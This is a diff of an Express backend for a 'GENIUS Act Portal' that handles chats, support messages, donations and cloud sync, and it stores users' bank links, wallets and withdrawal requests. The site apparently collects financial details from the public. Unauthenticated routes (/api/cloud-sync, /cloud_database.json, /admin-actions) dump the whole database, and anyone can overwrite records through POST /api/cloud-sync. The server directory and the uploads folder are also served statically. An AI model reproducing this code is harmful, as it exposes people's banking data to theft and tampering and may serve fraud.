@@ -892,20 +1113,49 @@ app.post('/api/chat/message', (req, res) => {
     }
     const currentDb = getCloudDb();
     const chats = currentDb['geniusact_contact_chats'] || [];
-    const incomingChat = {
-      chatId: chatId || ('guest_' + Date.now()),
-      userEmail: userEmail || 'guest@geniusact.org',
-      userName: userName || 'Guest Visitor',
-      accountId: accountId || 'FEC-87492109',
-      isGuest: Boolean(isGuest),
-      lastUpdated: new Date().toISOString(),
-      unreadAdminCount: 1,
-      unreadUserCount: 0,
-      messages: [message]
+    const cleanEmail = userEmail ? String(userEmail).toLowerCase() : null;
+
+    let existingChat = chats.find(c => 
+      (chatId && c.chatId === chatId) || 
+      (cleanEmail && c.userEmail && c.userEmail.toLowerCase() === cleanEmail)
+    );
+
+    const now = new Date().toISOString();
+    const msgObj = {
+      id: message.id || ('m_' + Date.now()),
+      sender: message.sender || 'user',
+      text: message.text || '',
+      media: message.media || null,
+      timestamp: message.timestamp || now,
+      accountId: accountId || (existingChat ? existingChat.accountId : 'FEC-87492109')
     };
-    currentDb['geniusact_contact_chats'] = mergeContactChatsServer(chats, [incomingChat]);
+
+    if (existingChat) {
+      if (!Array.isArray(existingChat.messages)) existingChat.messages = [];
+      existingChat.messages.push(msgObj);
+      existingChat.lastUpdated = now;
+      existingChat.unreadAdminCount = (existingChat.unreadAdminCount || 0) + 1;
+      if (userName && userName !== 'Guest Visitor') existingChat.userName = userName;
+      if (cleanEmail) existingChat.userEmail = cleanEmail;
+    } else {
+      existingChat = {
+        chatId: chatId || ('chat_' + (cleanEmail ? cleanEmail.replace(/[^a-z0-9]/g, '_') : Date.now())),
+        userEmail: cleanEmail || 'supportgeniusactglobal@gmail.com',
+        userName: userName || 'Guest Visitor',
+        accountId: accountId || 'FEC-87492109',
+        isGuest: Boolean(isGuest),
+        createdAt: now,
+        lastUpdated: now,
+        unreadAdminCount: 1,
+        unreadUserCount: 0,
+        messages: [msgObj]
+      };
+      chats.unshift(existingChat);
+    }
+
+    currentDb['geniusact_contact_chats'] = chats;
     saveCloudDb(currentDb);
-    return res.json({ success: true, chats: currentDb['geniusact_contact_chats'] });
+    return res.json({ success: true, chat: existingChat, chats });
   } catch (err) {
     return res.status(500).json({ error: err.message });
   }
@@ -917,35 +1167,44 @@ app.post('/api/chat/admin-reply', (req, res) => {
     if ((!chatId && !userEmail) || !message) return res.status(400).json({ error: 'ChatId or userEmail, and message required' });
     const currentDb = getCloudDb();
     const chats = currentDb['geniusact_contact_chats'] || [];
+    const cleanEmail = userEmail ? String(userEmail).toLowerCase() : null;
+
     let targetChat = chats.find(c => 
       (chatId && c.chatId === chatId) || 
-      (userEmail && c.userEmail && c.userEmail.toLowerCase() === String(userEmail).toLowerCase()) ||
-      (chatId && c.userEmail && c.userEmail.toLowerCase() === String(chatId).toLowerCase())
+      (cleanEmail && c.userEmail && c.userEmail.toLowerCase() === cleanEmail)
     );
+
+    const now = new Date().toISOString();
+    const msgObj = {
+      id: message.id || ('r_' + Date.now()),
+      sender: 'admin',
+      text: message.text || (typeof message === 'string' ? message : ''),
+      media: message.media || null,
+      timestamp: message.timestamp || now
+    };
 
     if (targetChat) {
       if (!Array.isArray(targetChat.messages)) targetChat.messages = [];
-      targetChat.messages.push(message);
-      targetChat.lastUpdated = new Date().toISOString();
+      targetChat.messages.push(msgObj);
+      targetChat.lastUpdated = now;
       targetChat.unreadUserCount = (targetChat.unreadUserCount || 0) + 1;
       targetChat.unreadAdminCount = 0;
     } else {
       targetChat = {
         chatId: chatId || ('chat_' + Date.now()),
-        userEmail: userEmail || (String(chatId).includes('@') ? chatId : 'visitor@geniusact.org'),
-        userName: userEmail ? userEmail.split('@')[0] : 'Visitor',
+        userEmail: cleanEmail || 'supporter@geniusact.org',
+        userName: cleanEmail ? cleanEmail.split('@')[0] : 'Visitor',
         isGuest: true,
-        lastUpdated: new Date().toISOString(),
+        lastUpdated: now,
         unreadUserCount: 1,
         unreadAdminCount: 0,
-        messages: [message]
+        messages: [msgObj]
       };
-      chats.push(targetChat);
+      chats.unshift(targetChat);
     }
 
-    currentDb['geniusact_contact_chats'] = mergeContactChatsServer(chats, [targetChat]);
     saveCloudDb(currentDb);
-    return res.json({ success: true, chats: currentDb['geniusact_contact_chats'] });
+    return res.json({ success: true, chat: targetChat, chats });
   } catch (err) {
     return res.status(500).json({ error: err.message });
   }
@@ -972,69 +1231,157 @@ app.post('/api/support/message', (req, res) => {
     if (!msg || !msg.message) return res.status(400).json({ error: 'Message content is required' });
     const currentDb = getCloudDb();
     const msgs = currentDb['geniusact_support_messages'] || [];
-    if (!msg.id) msg.id = 'sup_' + Date.now();
-    if (!msg.timestamp) msg.timestamp = new Date().toISOString();
-    msgs.unshift(msg);
+    msgs.unshift({
+      id: msg.id || ('sup_' + Date.now()),
+      userEmail: msg.userEmail || 'Guest',
+      subject: msg.subject || 'General Support Inquiry',
+      message: msg.message,
+      timestamp: msg.timestamp || new Date().toISOString(),
+      status: 'unread'
+    });
     currentDb['geniusact_support_messages'] = msgs;
     saveCloudDb(currentDb);
-    return res.json({ success: true, support_messages: currentDb['geniusact_support_messages'] });
+    return res.json({ success: true, support_messages: msgs });
   } catch (err) {
     return res.status(500).json({ error: err.message });
   }
 });
 
-// ---------------------------------------------------------------------
-// Bank Link & Withdrawal Endpoints
-// ---------------------------------------------------------------------
-app.post('/api/bank/link', (req, res) => {
+// -------------------------------------------------------------
+// CLOUD-SYNC GET & POST ENDPOINTS
+// -------------------------------------------------------------
+
+app.get(['/api/cloud-sync', '/cloud_database.json'], (req, res) => {
+  const dbData = getCloudDb();
+  res.json(dbData);
+});
+
+app.post('/api/cloud-sync', (req, res) => {
   try {
-    const bankData = req.body;
-    if (!bankData || !bankData.userEmail || !bankData.bankName) {
-      return res.status(400).json({ error: 'Valid bank details required.' });
+    let payload = req.body;
+    if (payload && payload.expectedOtp) {
+      try {
+        payload = typeof payload.expectedOtp === 'string' ? JSON.parse(payload.expectedOtp) : payload.expectedOtp;
+      } catch (e) {
+        payload = req.body;
+      }
     }
-    const currentDb = getCloudDb();
-    const links = currentDb['geniusact_bank_links'] || [];
-    const cleanEmail = String(bankData.userEmail).trim().toLowerCase();
 
-    const existingIdx = links.findIndex(l => l.userEmail && l.userEmail.toLowerCase() === cleanEmail);
-    if (existingIdx > -1) {
-      links[existingIdx] = { ...links[existingIdx], ...bankData, linkedAt: new Date().toISOString() };
-    } else {
-      if (!bankData.id) bankData.id = 'LINK-' + Date.now();
-      bankData.linkedAt = new Date().toISOString();
-      links.unshift(bankData);
+    if (!payload || typeof payload !== 'object') {
+      return res.status(400).json({ error: 'Invalid payload' });
     }
-    currentDb['geniusact_bank_links'] = links;
+
+    let currentDb = getCloudDb();
+
+    // Preserve and merge data keys
+    const syncKeys = [
+      'geniusact_approved_users',
+      'geniusact_pending_users',
+      'geniusact_visitor_logs',
+      'geniusact_global_wallets',
+      'geniusact_support_messages',
+      'geniusact_bank_links',
+      'geniusact_contact_chats',
+      'geniusact_user_footprints',
+      'geniusact_withdrawal_requests'
+    ];
+
+    syncKeys.forEach(k => {
+      if (payload[k] !== undefined) {
+        if (Array.isArray(payload[k])) {
+          currentDb[k] = payload[k];
+        } else if (typeof payload[k] === 'object' && payload[k] !== null) {
+          currentDb[k] = { ...(currentDb[k] || {}), ...payload[k] };
+        }
+      }
+    });
+
     saveCloudDb(currentDb);
-    return res.json({ success: true, bank_links: links });
+    res.json({ success: true, data: currentDb });
   } catch (err) {
-    return res.status(500).json({ error: err.message });
+    res.status(500).json({ error: err.message });
   }
 });
 
-app.post('/api/withdraw/request', (req, res) => {
-  try {
-    const reqData = req.body;
-    if (!reqData || !reqData.userEmail || !reqData.amount) {
-      return res.status(400).json({ error: 'Email and amount required.' });
-    }
-    const currentDb = getCloudDb();
-    const reqs = currentDb['geniusact_withdrawal_requests'] || [];
-    if (!reqData.id) reqData.id = 'WDR-' + Date.now();
-    if (!reqData.timestamp) reqData.timestamp = new Date().toISOString();
-    reqData.status = 'pending';
-    reqs.unshift(reqData);
-    currentDb['geniusact_withdrawal_requests'] = reqs;
-    saveCloudDb(currentDb);
-    return res.json({ success: true, withdrawal_requests: reqs });
-  } catch (err) {
-    return res.status(500).json({ error: err.message });
-  }
+// -------------------------------------------------------------
+// CAMPAIGN PROGRESS, UPDATES & PUBLIC ENDPOINTS
+// -------------------------------------------------------------
+
+app.get('/api/donations/:supporter_hash', (req, res) => {
+  const currentDb = getCloudDb();
+  const approvedUsers = currentDb['geniusact_approved_users'] || [];
+  const { supporter_hash } = req.params;
+
+  const user = approvedUsers.find(u => (u.uid === supporter_hash) || (u.email && u.email.toLowerCase() === supporter_hash.toLowerCase()));
+  const userDonations = user && Array.isArray(user.donations) ? user.donations : [];
+  const total = user ? (user.amount || userDonations.reduce((sum, d) => sum + (d.amount || 0), 0)) : 0;
+
+  res.json({
+    success: true,
+    donations: userDonations.map(d => ({
+      receipt_id: d.id,
+      amount: d.amount,
+      description: d.description,
+      status: d.status || 'completed',
+      date: d.date
+    })),
+    total,
+    count: userDonations.length
+  });
 });
 
-// ---------------------------------------------------------------------
-// Page Routing & Static File Serving
-// ---------------------------------------------------------------------
+app.get('/api/campaign/progress', (req, res) => {
+  const currentDb = getCloudDb();
+  const progress = (currentDb.campaign_progress || []).map(r => ({
+    category: r.category,
+    goal: r.goal_amount,
+    current: r.current_amount,
+    description: r.description,
+    deadline: r.deadline,
+    percent: r.goal_amount > 0 ? Number(((r.current_amount / r.goal_amount) * 100).toFixed(1)) : 0
+  }));
+  res.json({ success: true, progress });
+});
+
+app.get('/api/campaign/updates', (req, res) => {
+  const currentDb = getCloudDb();
+  const updates = (currentDb.campaign_updates || []).map(r => ({
+    id: r.id,
+    title: r.title,
+    body: r.body,
+    tag: r.tag,
+    featured: Boolean(r.is_featured),
+    date: r.created_at
+  }));
+  res.json({ success: true, updates });
+});
+
+app.get('/api/campaign/allocation', (req, res) => {
+  const currentDb = getCloudDb();
+  res.json({ success: true, allocation: currentDb.fund_allocation || [] });
+});
+
+app.get('/api/broadcasts/latest', (req, res) => {
+  const currentDb = getCloudDb();
+  const activeBroadcasts = (currentDb.broadcasts || [])
+    .filter(b => b.is_active)
+    .slice(0, 5)
+    .map(b => ({ message: b.message, date: b.created_at }));
+  res.json({ success: true, broadcasts: activeBroadcasts });
+});
+
+app.get('/admin-actions', (req, res) => {
+  const currentDb = getCloudDb();
+  res.json({
+    success: true,
+    actions: (currentDb.admin_actions || []).slice(0, 50)
+  });
+});
+
+// -------------------------------------------------------------
+// STATIC ASSETS & ROUTING
+// -------------------------------------------------------------
+
 app.get('/', (req, res) => {
   res.redirect('/index.html');
 });
@@ -1047,16 +1394,12 @@ app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
-// Serve static files from root directory
+// Serve static assets and uploads
 app.use(express.static(__dirname));
 app.use('/assets', express.static(path.join(__dirname, 'assets')));
 app.use('/static', express.static(path.join(__dirname, 'static')));
-
-// Catch-all 404 handler for unknown routes
-app.use((req, res) => {
-  res.status(404).json({ error: 'Not found' });
-});
+app.use('/secure_storage', express.static(UPLOAD_FOLDER));
 
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`[Server] GENIUS Act Portal running on http://0.0.0.0:${PORT}`);
+  console.log(`[GeniusAct Server] Running authoritative backend on http://0.0.0.0:${PORT}`);
 });
